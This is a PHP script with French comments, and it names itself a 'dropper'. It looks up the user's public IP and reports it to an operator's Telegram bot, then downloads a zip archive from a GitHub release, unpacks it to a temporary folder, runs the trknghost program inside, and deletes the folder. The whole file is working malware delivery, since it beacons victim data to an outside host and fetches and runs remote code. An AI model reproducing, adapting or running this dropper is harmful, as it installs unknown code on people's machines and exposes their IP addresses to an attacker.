<?php
// --- CONFIG ---
$BOT_TOKEN = "TON_BOT_TOKEN_ICI";  // Remplace par ton token Telegram
$CHAT_ID_FILE = ".chatid";
$ZIP_URL = "https://github.com/trh4ckn0n/trknghost/releases/download/dl/trknghost.zip";

function get_public_ip() {
    $ip = @file_get_contents("https://api.ipify.org");
    if ($ip === false) return "IP inconnue";
    return trim($ip);
}

function save_chat_id($chat_id, $file) {
    file_put_contents($file, $chat_id);
}

function load_chat_id($file) {
    if (file_exists($file)) {
        return trim(file_get_contents($file));
    }
    return false;
}

function fetch_chat_id_from_updates($bot_token) {
    $url = "https://api.telegram.org/bot$bot_token/getUpdates";
    $response = @file_get_contents($url);
    if ($response === false) {
        echo "[!] Impossible d'accéder à getUpdates\n";
        return false;
    }
    $data = json_decode($response, true);
    if (!$data || !$data['ok']) {
        echo "[!] Erreur dans la réponse getUpdates\n";
        return false;
    }
    $results = $data['result'];
    if (empty($results)) {
        echo "[!] Aucun update disponible, envoie un message au bot Telegram en premier !\n";
        return false;
    }
    $last_update = end($results);
    if (isset($last_update['message']['chat']['id'])) {
        return $last_update['message']['chat']['id'];
    } elseif (isset($last_update['callback_query']['message']['chat']['id'])) {
        return $last_update['callback_query']['message']['chat']['id'];
    }
    return false;
}

function send_telegram_message($bot_token, $chat_id, $message) {
    $url = "https://api.telegram.org/bot$bot_token/sendMessage";
    $data = http_build_query([
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ]);
    $opts = ['http' =>
        [
            'method'  => 'POST',
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'content' => $data,
            'timeout' => 5,
        ]
    ];
    $context  = stream_context_create($opts);
    $result = @file_get_contents($url, false, $context);
    if ($result === false) {
        echo "[!] Erreur lors de l'envoi Telegram\n";
    } else {
        echo "[+] Notification Telegram envoyée.\n";
    }
}

function download_file($url, $dest) {
    echo "[*] Téléchargement de l'archive depuis $url...\n";
    $content = @file_get_contents($url);
    if ($content === false) {
        echo "[!] Erreur lors du téléchargement.\n";
        exit(1);
    }
    file_put_contents($dest, $content);
    echo "[+] Téléchargement terminé.\n";
}

function extract_zip($zip_path, $extract_to) {
    echo "[*] Extraction de l'archive vers $extract_to ...\n";
    $zip = new ZipArchive;
    if ($zip->open($zip_path) === TRUE) {
        $zip->extractTo($extract_to);
        $zip->close();
        echo "[+] Extraction terminée.\n";
    } else {
        echo "[!] Erreur lors de l'extraction du zip.\n";
        exit(1);
    }
}

function run_executable($folder) {
    $system = PHP_OS_FAMILY;
    chdir($folder);
    if ($system === "Windows") {
        $exe_path = $folder . DIRECTORY_SEPARATOR . "trknghost";
        if (file_exists($exe_path)) {
            echo "[*] Lancement de trknghost\n";
            pclose(popen("start /B " . escapeshellarg($exe_path), "r"));
        } else {
            echo "[!] trknghost non trouvé.\n";
            exit(1);
        }
    } else {
        $py_path = $folder . DIRECTORY_SEPARATOR . "trknghost.py";
        if (file_exists($py_path)) {
            echo "[*] Lancement de trknghost.py avec Python\n";
            $python = shell_exec("which python3") ?: shell_exec("which python");
            $python = trim($python);
            if (!$python) {
                echo "[!] Python non trouvé.\n";
                exit(1);
            }
            $cmd = escapeshellcmd("$python $py_path");
            passthru($cmd);
        } else {
            echo "[!] trknghost.py non trouvé.\n";
            exit(1);
        }
    }
}

function notify_dropper_usage($bot_token, $chat_id_file) {
    $chat_id = load_chat_id($chat_id_file);
    if (!$chat_id) {
        echo "[*] Chat ID inconnu, tentative de récupération automatique via getUpdates...\n";
        $chat_id = fetch_chat_id_from_updates($bot_token);
        if (!$chat_id) {
            echo "[!] Impossible de récupérer le chat ID automatiquement.\n";
            echo "[!] Pour régler ça, envoie un message à ton bot Telegram, puis relance ce script.\n";
            return;
        }
        save_chat_id($chat_id, $chat_id_file);
        echo "[+] Chat ID sauvegardé : $chat_id\n";
    } else {
        echo "[*] Chat ID chargé depuis fichier : $chat_id\n";
    }

    $ip = get_public_ip();
    $message = "⚠️ *Dropper utilisé !*\nIP publique de l'utilisateur : `$ip`";
    send_telegram_message($bot_token, $chat_id, $message);
}

// ------------- MAIN -------------

// Crée un dossier temporaire
$tmpdir = sys_get_temp_dir() . DIRECTORY_SEPARATOR . "trknghost_" . uniqid();
if (!mkdir($tmpdir, 0700)) {
    echo "[!] Impossible de créer le dossier temporaire\n";
    exit(1);
}

notify_dropper_usage($BOT_TOKEN, $CHAT_ID_FILE);

$zip_path = $tmpdir . DIRECTORY_SEPARATOR . "trknghost.zip";
download_file($ZIP_URL, $zip_path);
extract_zip($zip_path, $tmpdir);
run_executable($tmpdir);

// Nettoyage
function rrmdir($dir) {
    if (!is_dir($dir)) return;
    $files = array_diff(scandir($dir), ['.','..']);
    foreach ($files as $file) {
        $path = "$dir/$file";
        if (is_dir($path)) rrmdir($path); else unlink($path);
    }
    rmdir($dir);
}
rrmdir($tmpdir);
echo "[*] Nettoyage terminé.\n";

?>
